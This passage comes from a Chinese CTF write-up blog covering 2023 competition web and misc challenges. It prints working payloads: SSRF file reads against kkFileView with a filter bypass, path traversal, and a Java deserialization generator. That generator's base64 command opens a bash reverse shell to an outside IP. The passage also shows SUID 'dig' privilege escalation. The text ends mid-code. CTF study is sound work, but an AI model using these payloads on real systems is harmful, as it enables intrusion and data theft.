id="题解">题解</h3><p>综合上述</p><p>将文件写入</p><p><code>http://localhost:8012/onlinePreview?url=http://127.0.0.1:8012/getCorsFile.txt?urlPath=file:///C:/Windows/win.ini</code></p><p>读文件</p><p><code>http://localhost:8012/onlinePreview?url=http://127.0.0.1:8012/%09getCorsFile.txt</code></p><figure><img src="/img/2023香山杯/169795243493419.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>比赛环境已经关了，赛题的后续利用无法复现了</p><p>最后贴个lxxxin师傅的题解，参考：https://www.yuque.com/dat0u/ctf/lbp2gfi6gttxsymb</p><blockquote><p>最终Payload如下，题目应该是在nginx或者/onlinePreview路由处对proc、fd关键字做了匹配，由于是SSRF，会发起两次http请求，因此可以通过双重URL编码绕过</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-keyword">GET</span> <span class="hljs-string">/fileview/onlinePreview?url=http://localhost:8012/getCorsFile.jsp?urlPath=file:///%2570%2572%256f%2563/29/%2566%2564/6</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>101.201.35.76:22873<br></code></pre></td></tr></table></figure><figure><img src="/img/2023香山杯/169795243493420.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>绕过后，读取的文件内容会保存在getCorsFile.jsp中，用%09、%02等字符绕过一下读取文件即可</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-keyword">GET</span> <span class="hljs-string">/fileview/%09getCorsFile.jsp</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>101.201.35.76:22873<br></code></pre></td></tr></table></figure><figure><img src="/img/2023香山杯/169795243493421.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>比赛的时候，/flag提示我们要RCE，但是这题可以通过非预期读取/proc/29/fd/6获取到flag</p><figure><img src="/img/2023香山杯/169795243493422.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>预期应该是读/root/flag.java文件，然后再往下走......，这里因为赛后靶机关了，也就没机会尝试了，具体的flag.java代码如下，感兴趣的师傅可以自行尝试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.sql.Connection;<br><span class="hljs-keyword">import</span> java.sql.DriverManager;<br><span class="hljs-keyword">import</span> java.sql.SQLException;<br><span class="hljs-keyword">import</span> java.sql.Statement;<br><span class="hljs-keyword">import</span> java.util.Properties;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">flag</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Connection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">Properties</span> <span class="hljs-variable">prop</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Properties</span>();<br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">input</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            input = Files.newInputStream(Paths.get(<span class="hljs-string">&quot;/tmp/config.properties&quot;</span>));<br>            <span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>)&#123;<br>                <span class="hljs-comment">// 连接到SQLite数据库</span><br>                <span class="hljs-comment">// 创建一个属性对象</span><br>                prop.load(input);<br><br>                <span class="hljs-comment">// 创建一个Connection对象，并传入属性对象</span><br>                conn = DriverManager.getConnection(<span class="hljs-string">&quot;jdbc:sqlite:/tmp/mydatabase.db&quot;</span>, prop);<br>                <span class="hljs-comment">// 设置密码</span><br>                <span class="hljs-type">Statement</span> <span class="hljs-variable">stmt</span> <span class="hljs-operator">=</span> conn.createStatement();<br>                stmt.close();<br>                Thread.sleep(<span class="hljs-number">5000</span>);<br>            &#125;<br>            <span class="hljs-comment">// 接下来，你可以在此处执行其他操作</span><br>        &#125; <span class="hljs-keyword">catch</span> (SQLException e) &#123;<br>            System.out.println(e.getMessage());<br>        &#125; <span class="hljs-keyword">catch</span> (InterruptedException | IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125; <span class="hljs-keyword">finally</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-keyword">if</span> (conn != <span class="hljs-literal">null</span>) &#123;<br>                    conn.close();<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span> (SQLException ex) &#123;<br>                System.out.println(ex.getMessage());<br>            &#125;<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>启动文件（/root/start.sh）如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/bash</span><br><br>FLAG_PATH=/tmp/config.properties<br>FLAG_MODE=M_SED<br>if [ $&#123;ICQ_FLAG&#125; ];then<br>    case $FLAG_MODE in<br>        &quot;M_ECHO&quot;)<br>            echo -n $&#123;ICQ_FLAG&#125; &gt; $&#123;FLAG_PATH&#125;<br>            FILE_MODE=755 <br>            chmod $&#123;FILE_MODE&#125; $&#123;FLAG_PATH&#125;<br>            ;;<br>        &quot;M_SED&quot;)<br>            #sed -i &quot;s/flag&#123;x*&#125;/$&#123;ICQ_FLAG&#125;/&quot; $&#123;FLAG_PATH&#125;<br>            sed -i -r &quot;s/flag\&#123;.*\&#125;/$&#123;ICQ_FLAG&#125;/&quot; $&#123;FLAG_PATH&#125;<br>            ;;<br>        &quot;M_SQL&quot;)<br>            # sed -i -r &quot;s/flag\&#123;.*\&#125;/$&#123;ICQ_FLAG&#125;/&quot; $&#123;FLAG_PATH&#125;<br>            # mysql -uroot -proot &lt; $&#123;FLAG_PATH&#125;<br>            ;;<br>        *)<br>            ;;<br>    esac<br>    echo [+] ICQ_FLAG OK   <br>    unset ICQ_FLAG <br>else<br>    echo [!] no ICQ_FLAG<br>fi<br><br>unset ICQ_FLAG<br>rm -rf /etc/profile.d/pouchenv.sh<br>rm -rf /etc/instanceInfo<br>rm -rf /start.sh<br><br>/usr/sbin/nginx<br><br>/usr/sbin/crond<br><br>/usr/sbin/rsyslogd<br><br>javac /root/flag.java<br>nohup java -classpath /root/sqlite-jdbc-3.41.2.2.jar:/root/ flag &gt;/dev/null &amp;<br><br>nohup java -jar /root/upload.jar &gt;/dev/null &amp;<br>sleep 1;<br><br>rm /tmp/config.properties<br><br>java -Dfile.encoding=UTF-8 -Dsun.java2d.cmm=sun.java2d.cmm.kcms.KcmsServiceProvider -Dspring.config.location=/opt/kkFileView-2.2.1/config/application.properties -jar /opt/kkFileView-2.2.1/bin/kkFileView-2.2.1.jar &amp;<br>exec tail -f /dev/null<br></code></pre></td></tr></table></figure></blockquote><h3 id="参考">参考</h3><p>https://www.xx5xx.top/Writeup/WEB/2023%E9%A6%99%E5%B1%B1%E6%9D%AF-sharedBox/</p><p>https://www.yuque.com/dat0u/ctf/lbp2gfi6gttxsymb</p><p>https://www.cnblogs.com/xbbth/p/17446987.html</p><p>https://github.com/kekingcn/kkFileView/issues/128</p><h1 id="misc">MISC</h1><h2 id="pintu">PINTU</h2><p>图片像素rgb值转2进制再转成字符串发现提示</p><p>然后图片高度隐写，8进制转10进制再转成ascii，发现是每两个字符为一组（因为中间有空格分隔）</p><p>再转一次ascii码，得到一串字符串</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>os.chdir(os.path.dirname(__file__))<br><br><span class="hljs-comment">#img_width = 65 # 所有图片的统一宽度</span><br>img_num = <span class="hljs-number">4703</span> <span class="hljs-comment"># 图片总数</span><br>num = <span class="hljs-string">&#x27;&#x27;</span>  <span class="hljs-comment">#图片像素转二进制</span><br>heigth_list = [] <span class="hljs-comment">#高度list</span><br>ten_chr = <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-comment">#高度转10进制</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, img_num+<span class="hljs-number">1</span>):<br>    img = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">f&#x27;pintu/<span class="hljs-subst">&#123;i&#125;</span>.png&#x27;</span>) <span class="hljs-comment"># 打开图片</span><br>    <span class="hljs-comment">#像素rgb转二进制</span><br>    pixel = img.getpixel((<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))[<span class="hljs-number">0</span>]<br>    <span class="hljs-comment">#print(pixel)</span><br>    <span class="hljs-keyword">if</span> pixel == <span class="hljs-number">0</span>:<br>        num += <span class="hljs-string">&#x27;0&#x27;</span><br>    <span class="hljs-keyword">else</span>:<br>        num += <span class="hljs-string">&#x27;1&#x27;</span><br>    <br>    heigth_list.append(img.height)<br>    <br>num = <span class="hljs-built_in">int</span>(num,<span class="hljs-number">2</span>)<br><span class="hljs-built_in">print</span>(long_to_bytes(num).decode())<br><span class="hljs-string">&#x27;&#x27;&#x27;flag看到666c是不是特别兴奋，很可惜flag并不在这。（狗头保命），既然走到了这里，那我也给一个通关的关键信息拿去吧，去找到真正的flag吧：sUvcu5rgSeAmJQCfdXtEMKIB91Lj3niOo4hyV0b/2azpx8HqZP6wk7GNlTFYDR+W                        </span><br><span class="hljs-string">         哎，对了。拿走之前看一看我精心挑选的笑话吧：猎人打猎，朝狐狸开枪，“砰”地一声枪响之后猎人死了。狐狸叉着腰，冷笑一声：</span><br><span class="hljs-string">“没想到吧，我是反射弧。”好不好笑， 有没有感觉一哆嗦，大脑更清晰了。ฅ՞•ﻌ•՞ ต&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> heigth_list:<br>    ten_chr += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">str</span>(i),<span class="hljs-number">8</span>))  <span class="hljs-comment">#8转10转ascii</span><br><span class="hljs-comment">#print(heigth_list)</span><br><span class="hljs-built_in">print</span>(ten_chr)<br><br>data = ten_chr.split(<span class="hljs-string">&#x27; &#x27;</span>)<br><span class="hljs-comment">#print(data)</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(data)):<br>    flag += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(data[i]))<br><span class="hljs-built_in">print</span>(flag)<br><br><span class="hljs-commentspan><br></code></pre></td></tr></table></figure><p>base32-&gt;base64换表-&gt;base64</p><figure><img src="/img/2023香山杯/169795243493423.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>拿到一张rgb很混乱的图片，Piet隐写</p><p>用工具npiet</p><p>下载：https://www.bertnase.de/npiet/</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Python">npiet.exe -tpic download.png <br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>web</category>
      
      <category>misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>misc</tag>
      
      <tag>wp</tag>
      
      <tag>web</tag>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023柏鹭杯</title>
    <link href="/2023/10/18/2023%E6%9F%8F%E9%B9%AD%E6%9D%AF/"/>
    <url>/2023/10/18/2023%E6%9F%8F%E9%B9%AD%E6%9D%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="柏鹭杯">2023柏鹭杯</h1><h1 id="web">WEB</h1><h2 id="express-fs">express fs</h2><p>参考：https://www.cnblogs.com/91ac0m0/p/17557039.html</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Python">?file[protocol]=file:&amp;file[href]=a&amp;file[pathname]=fl%2561g.txt&amp;file[hostname]=&amp;file[origin]=x<br></code></pre></td></tr></table></figure><h2 id="综合题5">综合题5</h2><p>源码中有<code>/readfile?filename=</code></p><p>目录穿越读文件<code>/../../../../../app/demo.jar</code></p><p>拿到源码</p><p>Upload.class，upload类中有混淆加密的flag1</p><figure><img src="/img/2023柏鹭杯/16976293252215.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>逆向一下得到flag1</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ReverseUpload</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> <span class="hljs-variable">O0O</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;6925cc02789c1d2552b71acc4a2d48fd&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">ReverseUpload</span> <span class="hljs-variable">uploader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReverseUpload</span>();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">originalEncFlag1</span> <span class="hljs-operator">=</span> uploader.decryptEncFlag1();<br>        System.out.println(<span class="hljs-string">&quot;Original enc_flag1: &quot;</span> + originalEncFlag1);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> String <span class="hljs-title function_">decryptEncFlag1</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">base64EncodedFlag1</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;UFVTUhgqY3d0FQxRVFcHBlQLVwdSVlZRVlJWBwxeVgAHWgsBWgUAAQEJRA==&quot;</span>;<br>        <span class="hljs-type">byte</span>[] decodedBytes = Base64.getDecoder().decode(base64EncodedFlag1);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">decodedString</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(decodedBytes);<br><br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">decryptedFlag</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; decodedString.length(); i++) &#123;<br>            <span class="hljs-type">char</span> <span class="hljs-variable">originalChar</span> <span class="hljs-operator">=</span> decodedString.charAt(i);<br>            <span class="hljs-type">char</span> <span class="hljs-variable">oOO</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.O0O.charAt(i % <span class="hljs-built_in">this</span>.O0O.length());<br>            <span class="hljs-type">char</span> <span class="hljs-variable">encryptedChar</span> <span class="hljs-operator">=</span> (<span class="hljs-type">char</span>) (originalChar ^ oOO);<br>            decryptedFlag.append(encryptedChar);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> decryptedFlag.toString();<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//Original enc_flag1: flag&#123;ISEC-52e353a950c752b3dc8f0d1c949f0361&#125;</span><br></code></pre></td></tr></table></figure><h2 id="综合题6"><strong>综合题</strong>6</h2><p>源码中Ping.class是一个恶意类，readObject反序列化，exec可以命令执行</p><figure><img src="/img/2023柏鹭杯/16976293252171.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>通过Upload类的<code>/internalApi/v3.2/updateConfig</code>此路由可以反序列化加载恶意类Ping进行命令执行</p><figure><img src="/img/2023柏鹭杯/16976293252172.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>Ser.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">package</span> com.example.demo;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Ser</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">// Create a Ping object</span><br>        <span class="hljs-type">Ping</span> <span class="hljs-variable">ping</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Ping</span>();<br>        ping.setCommand(<span class="hljs-string">&quot;bash&quot;</span>);<br>        ping.setArg1(<span class="hljs-string">&quot;-c&quot;</span>);<br>        ping.setArg2(<span class="hljs-string">&quot;bash -c &#x27;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjEyLjI1MS42Mi80NTY3IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;&quot;</span>);<br><br>        <span class="hljs-comment">// Serialize the Ping object to a byte array</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(ping);<br><br>        <span class="hljs-comment">// Encode the byte array to Base64</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(Base64.getEncoder().encode(baos.toByteArray()));<br>        System.out.println(<span class="hljs-string">&quot;Payload: &quot;</span> + payload);<br>    &#125;<br>&#125;<br><span class="hljs-comment">//Payload: rO0ABXNyABVjb20uZXhhbXBsZS5kZW1vLlBpbmcAAAAAAAAAAQIAA0wABGFyZzF0ABJMamF2YS9sYW5nL1N0cmluZztMAARhcmcycQB+AAFMAAdjb21tYW5kcQB+AAF4cHQAAi1jdABfYmFzaCAtYyAne2VjaG8sWW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eExqRXlMakkxTVM0Mk1pODBOVFkzSURBK0pqRT19fHtiYXNlNjQsLWR9fHtiYXNoLC1pfSd0AARiYXNo</span><br></code></pre></td></tr></table></figure><p>反弹shell</p><figure><img src="/img/2023柏鹭杯/16976293252183.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>find找suid，dig提权，<code>/usr/bin/dig -f /root/flag2</code></p><figure><img src="/img/2023柏鹭杯/16976293252184.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h2 id="综合题7">综合题7</h2><p>这题当时差一点时间没打出来，当时上传了msf马到服务器上搭好了隧道redis写了ssh的公钥</p><p>赛后看了很多师傅的wp，都是用frp代理进去，写公钥后连上去即可</p><p>具体参考</p><p><ahref="http://blog.xmcve.com/2023/10/13/%E6%9F%8F%E9%B9%AD%E6%9D%AF2023-Writeup/#title-4">星盟</a><ahref="https://www.cnblogs.com/V3g3t4ble/p/17757854.html">V3g3t4ble</a><ahref="https://fushuling.com/index.php/2023/10/12/2023%e7%bd%91%e4%bf%a1%e6%9f%8f%e9%b9%ad%e6%9d%af%e5%a4%a7%e5%ad%a6%e7%94%9f%e7%bd%91%e7%bb%9c%e7%a9%ba%e9%97%b4%e5%ae%89%e5%85%a8%e7%b2%be%e8%8b%b1%e8%b5%9b/">fushulingのblog</a></p><h1 id="misc">MISC</h1><h2 id="签到">签到</h2><p>每一行的空格数量为flag的ascii，转一下得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs Python">x = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;qd.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    aa = f.readlines()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> aa:<br>        x += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">len</span>(i)-<span class="hljs-number">1</span>)<br><span class="hljs-built_in">print</span>(x)<br><span class="hljs-comment">#flag&#123;ISEC-eF8x2Bv1viw9eFvagivx0Ynv3jlai0vL&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>web</category>
      
      <category>misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>misc</tag>
      
      <tag>wp</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NSSCTF 2nd</title>
    <link href="/2023/09/18/NSSCTF%202nd/"/>
    <url>/2023/09/18/NSSCTF%202nd/</url>
    
    <content type="html"><![CDATA[<h1 id="nssctf-2nd">NSSCTF 2nd</h1><h1 id="web">WEB</h1><h2 id="myboxrevenge">MyBox(revenge)</h2><p>给了一个url的参数，可以利用file读文件</p><p><code>?url=file:///etc/passwd</code></p><figure><img src="/img/NSSCTF%202nd/17006210687199.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>ban了<code>/proc/1/environ</code>，<code>/start.sh</code>等非预期</p><p>读<code>/app/app.py</code>拿到源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs Plain">from flask import Flask, request, redirect<br>import requests, socket, struct<br>from urllib import parse<br>app = Flask(__name__)<br><br>@app.route(&#x27;/&#x27;)<br>def index():<br>    if not request.args.get(&#x27;url&#x27;):<br>        return redirect(&#x27;/?url=dosth&#x27;)<br>    url = request.args.get(&#x27;url&#x27;)<br>    if url.startswith(&#x27;file://&#x27;):<br>        if &#x27;proc&#x27; in url or &#x27;flag&#x27; in url:<br>            return &#x27;no!&#x27;<br>        with open(url[7:], &#x27;r&#x27;) as f:<br>            data = f.read()<br>            if url[7:] == &#x27;/app/app.py&#x27;:<br>                return data<br>            if &#x27;NSSCTF&#x27; in data:<br>                return &#x27;no!&#x27;<br>            return data<br>    elif url.startswith(&#x27;http://localhost/&#x27;):<br>        return requests.get(url).text<br>    elif url.startswith(&#x27;mybox://127.0.0.1:&#x27;):<br>        port, cont    ent = url[18:].split(&#x27;/_&#x27;, maxsplit=1)<br>        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>        s.settimeout(5)<br>        s.connect((&#x27;127.0.0.1&#x27;, int(port)))<br>        s.send(parse.unquote(content).encode())<br>        res = b&#x27;&#x27;<br>        while 1:<br>            data = s.recv(1024)<br>            if data:<br>                res += data<br>            else:<br>                break<br>        return res<br>    return &#x27;&#x27;<br><br>app.run(&#x27;0.0.0.0&#x27;, 827)<br></code></pre></td></tr></table></figure><p>重点看23行<code>elif url.startswith('mybox://127.0.0.1:'):</code>，建立了一个到127.0.0.1上的指定端口（827）的TCP的socket通信</p><p>相当于一个gopher协议的替换，即把gopher://127.0.0.1改成mybox://127.0.01</p><p>然后目的很明显了，gopher打ssrf</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> urllib.parse<br>test =<span class="hljs-string">&quot;&quot;&quot;GET 